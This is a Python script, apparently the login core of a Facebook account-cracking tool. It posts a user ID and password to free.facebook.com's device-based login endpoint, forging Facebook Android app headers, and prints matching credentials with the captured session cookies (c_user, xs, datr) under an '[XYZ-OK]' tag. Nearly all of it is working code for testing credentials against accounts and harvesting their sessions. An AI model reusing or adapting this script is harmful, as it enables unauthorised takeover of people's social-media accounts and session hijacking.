# METOD FACEBOOK VERSION 2
 
import requests, re, random,os
from rich import print as prints
from rich.tree import Tree
 
 
#-----[---login method---]-----#
#-----[---put here and id uid for test---]-----#
methodlogin = "free.facebook.com"
userid = "1216298951" # Id Facebook
#-----[---put here id password---]-----#
password = "XyzHackers" # password Facebook
#-----[---put here user agent---]-----#
ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 
def cek(): 
	session = requests.Session()
	kawaii = {
	"Host": methodlogin,
	"Upgrade-Insecure-Requests": "1",
	"User-Agent": ua,
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"Dnt": "1",
	"X-Requested-With": "com.facebook.katana",
	"Sec-Fetch-Site": "same-origin",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-User": "empty",
	"Sec-Fetch-Dest": "document",
	"Referer": f"https://{methodlogin}/",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7"}
	baka = session.get(f"https://{methodlogin}/login/device-based/password/?uid={userid}&flow=login_no_pin&refsrc=deprecated&_rdr",headers=kawaii).text 
	alicia = {
	"lsd": re.search('name="lsd" value="(.*?)"',str(baka)).group(1),
	"jazoest": re.search('name="jazoest" value="(.*?)"', str(baka)).group(1),
	"uid": userid,
	"next": f"https://{methodlogin}/login/save-device/",
	"flow": "login_no_pin",
	"pass": password}
	cook = {'cookie': (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])+';m_pixel_ratio=1.7000000476837158;wd=424x781'}
	oppai = {
	"Host": methodlogin,
	"Cache-Control": "max-age=0",
	"Upgrade-Insecure-Requests": "1",
	"Origin": f"https://{methodlogin}",
	"Content-Type": "application/x-www-form-urlencoded",
	"User-Agent": ua,
	"Accept": "*/*",
	"X-Requested-With": "com.facebook.katana",
	"Sec-Fetch-Site": "same-origin",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-User": "empty",
	"Sec-Fetch-Dest": "document",
	'Referer': f'https://{methodlogin}/login/device-based/password/?uid={userid}&flow=login_no_pin&refsrc=deprecated&_rdr',
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7"}
	ikeh = session.post(f"https://{methodlogin}/login/device-based/validate-password/?shbl=0",data=alicia,cookies=cook,headers=oppai,allow_redirects=False)
	if "c_user" in session.cookies.get_dict():
		kueh = session.cookies.get_dict()
		cookie = "datr=" + kueh["datr"] + ";" + ("sb=" + kueh["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + kueh["c_user"]) + ";" + ("xs=" + kueh["xs"]) + ";" + ("fr=" + kueh["fr"]) + ";"
		prints(session.cookies.get_dict())
		prints(cook)
		prints(alicia)
		print(f"\033[1;92m[XYZ-OK] {userid} - {password}\n\033[1;97m[\033[1;92mCOOKIE 🍪\033[1;97m]\033[1;92m {cookie}")
	elif "checkpoint" in session.cookies.get_dict():
		print(f" \033[1;91m{userid} - {password}")
		
		
os.system("clear") 
cek()
 